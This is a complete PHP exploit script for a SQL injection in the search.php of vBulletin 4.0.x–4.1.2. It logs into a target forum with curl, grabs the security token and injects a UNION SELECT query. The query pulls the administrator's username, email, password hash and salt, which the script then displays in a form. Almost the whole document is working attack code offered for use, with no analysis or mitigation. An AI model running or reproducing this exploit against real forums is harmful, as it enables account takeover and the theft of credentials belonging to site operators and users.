<?
/*
vBulletin 4.0.x => 4.1.2 (search.php) SQL Injection Vulnerability

                      888               888    888               
                      888               888    888               
                      888               888    888               
 .d8888b .d88b.   .d88888  .d88b.   .d88888    88888b.  888  888 
d88P"   d88""88b d88" 888 d8P  Y8b d88" 888    888 "88b 888  888 
888     888  888 888  888 88888888 888  888    888  888 888  888 
Y88b.   Y88..88P Y88b 888 Y8b.     Y88b 888    888 d88P Y88b 888 
 "Y8888P "Y88P"   "Y88888  "Y8888   "Y88888    88888P"   "Y88888 
                                                             888 
                                                        Y8b d88P 
                                                         "Y88P"  
														 
8888888b.         d8888 888888b.    .d8888b.   .d88888b.  888     888 888b    888 
888   Y88b       d88888 888  "88b  d88P  Y88b d88P" "Y88b 888     888 8888b   888 
888    888      d88P888 888  .88P       .d88P 888     888 888     888 88888b  888 
888   d88P     d88P 888 8888888K.      8888"  888     888 888     888 888Y88b 888 
8888888P"     d88P  888 888  "Y88b      "Y8b. 888     888 888     888 888 Y88b888 
888 T88b     d88P   888 888    888 888    888 888     888 888     888 888  Y88888 
888  T88b   d8888888888 888   d88P Y88b  d88P Y88b. .d88P Y88b. .d88P 888   Y8888 
888   T88b d88P     888 8888888P"   "Y8888P"   "Y88888P"   "Y88888P"  888    Y888 


mail : v.b-4@hotmail.com
*/
?>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1256" />
	<center>
<h1>vBulletin 4.0.x => 4.1.2 (search.php) SQL Injection Vulnerability</h1>

<form method='post' action=''>
<table border='1'>
<tr><td>Forum Url</td><td> <input type='text' size='100' name='url' value=''></td></tr>
<tr><td>User name</td><td> <input type='text' size='100' name='username' value=''></td></tr>
<tr><td>Password </td><td><input type='text' size='100' name='password' value='' ></td></tr>
<tr><td>Admin ID </td><td><input type='text' size='100' name='admin_id' value=''></td></tr>
<tr><td>Valid Group Search Word</td><td><input type='text'  size='100' name='query'value='romnce'></td></tr>
</table>
<input type="hidden" name="form_action" value="1">
<input type='submit' value='Get'>
</form>
</center>

<?
 if($_POST['form_action'] == 1 )
 {
$query=$_POST["query"];
$url=$_POST["url"];
$admin_id=$_POST["admin_id"];

$sql="&cat[0]=1) UNION SELECT concat(username,0x3a,email,0x3a,password,0x3a,salt) FROM user WHERE userid=".$admin_id."#";
$user=$_POST["username"];
$pass=$_POST["password"];
       $md5Pass = md5($pass);
       $data = "do=login&url=%2Findex.php&vb_login_md5password=$md5Pass&vb_login_username=$user&cookieuser=1";

       $ch = curl_init();

    curl_setopt ($ch, CURLOPT_URL, $url."/login.php?do=login"); // replace ** with tt
    curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)");
    curl_setopt ($ch, CURLOPT_TIMEOUT, '10');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$data);
    curl_setopt($ch, CURLOPT_COOKIEJAR, "vb.txt");
    curl_setopt($ch, CURLOPT_COOKIEFILE, "vb.txt");
   // curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	//curl_setopt($ch, CURLOPT_PROXY, "127.0.0.1:8118"); 
    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
    $store = curl_exec ($ch);

        curl_close($ch);
       $ch = curl_init();

    curl_setopt ($ch, CURLOPT_URL, $url."/search.php"); // replace ** with tt
    curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)");
   
   
   
    curl_setopt($ch, CURLOPT_COOKIEJAR, "vb.txt");
    curl_setopt($ch, CURLOPT_COOKIEFILE, "vb.txt");
    //curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	//curl_setopt($ch, CURLOPT_PROXY, "127.0.0.1:8118"); 
    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
    $store = curl_exec ($ch);

        curl_close($ch);
		$sec=myf($store,'var SECURITYTOKEN = "','";');
		

       $ch = curl_init();

    curl_setopt ($ch, CURLOPT_URL, $url."/search.php"); 
    curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)");
    curl_setopt ($ch, CURLOPT_TIMEOUT, '10');
    curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch,CURLOPT_POSTFIELDS,"type%5B%5D=7&query=".$query."&titleonly=1&searchuser=&exactname=1&tag=&dosearch=Search+Now&searchdate=0&beforeafter=after&sortby=relevance&order=descending&saveprefs=1&s=&securitytoken=".$sec."&do=process&searchthreadid=".$sql);
    curl_setopt($ch, CURLOPT_COOKIEJAR, "vb.txt");
    curl_setopt($ch, CURLOPT_COOKIEFILE, "vb.txt");
    
	//curl_setopt($ch, CURLOPT_PROXY, "127.0.0.1:8118"); 
    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
    $store = curl_exec ($ch);

        curl_close($ch);



$url2= trim(myf($store,"Location:","Content-Length:"));

       $ch = curl_init();
    curl_setopt ($ch, CURLOPT_URL,$url2); 
    curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)");
   curl_setopt($ch, CURLOPT_COOKIEJAR, "vb.txt");
    curl_setopt($ch, CURLOPT_COOKIEFILE, "vb.txt");
    //curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	//curl_setopt($ch, CURLOPT_PROXY, "127.0.0.1:8118"); 
    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
    $store = curl_exec ($ch);

        curl_close($ch);
echo("<table border='1'>");
$list=explode(":", myf($store,'<p class="description">','</p>'));
echo("<tr><td>User Name</td><td><input size='100' type='text' value='".str_replace("Uncategorized,","",$list['3'])."'></td></tr>");
echo("<tr><td>Mail</td><td><input size='100' type='text' value='".$list['4']."'></td></tr>");
echo("<tr><td>MD5</td><td><input size='100' type='text' value='".$list['5']."'></td></tr>");
echo("<tr><td>Salt</td><td><input size='100' type='text' value='".$list['6']."'></td></tr>");

//print_r($list);
}
function myf($text,$marqueurDebutLien,$marqueurFinLien)

{

$ar0=explode($marqueurDebutLien, $text);
$ar1=explode($marqueurFinLien, $ar0[1]);
$ar=$ar1[0];
return trim($ar);
}
?>